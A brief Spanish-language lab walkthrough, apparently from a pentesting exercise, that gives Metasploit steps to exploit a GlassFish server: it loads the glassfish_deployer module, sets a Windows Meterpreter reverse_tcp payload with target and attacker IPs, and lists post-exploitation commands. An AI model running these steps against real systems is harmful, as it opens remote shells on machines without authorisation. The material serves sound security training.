# Glassfish

## Pasos a seguir
Buscamos los puertos pertenecientes al servicio

<img src=exploits_img/glassfish1.png alt="Buscar puertos glassfish" width="500" height="650">

Comprobamos que el servcio está activo en el puerto indicado

<img src=exploits_img/glassfish2.png alt="Servicio activo glassfish" width="500" height="300">

Abrimos primero 'msfconsole'

Seleccionamos el módulo con 'use exploit/mult/http/glassfish_deployer'

Buscamos las opciones con 'show options'

Establecemos la dirección IP de la máquina víctima (RHOST), el tipo de payload que deseas utilizar (PAYLOAD)
y tu propia dirección IP (LHOST) para la conexión inversa:

set RHOST 192.168.1.144

set PAYLOAD windows/meterpreter/reverse_tcp

set LHOST 192.168.1.143

Ejecutamos el exploit con: 'exploit'

<img src=exploits_img/glassfish3.png alt="Exploit glassfish" width="500" height="250">

## Una vez dentro podemos ejecutar

-sysinfo: Para obtener información sobre el sistema operativo de la máquina víctima.

-getuid: Para obtener el identificador del usuario actual en la máquina víctima.

-ipconfig: Para obtener información sobre la configuración de red de la máquina víctima(depende del sistema operativo de la víctima).

-ps: Para listar los procesos en ejecución en la máquina víctima.
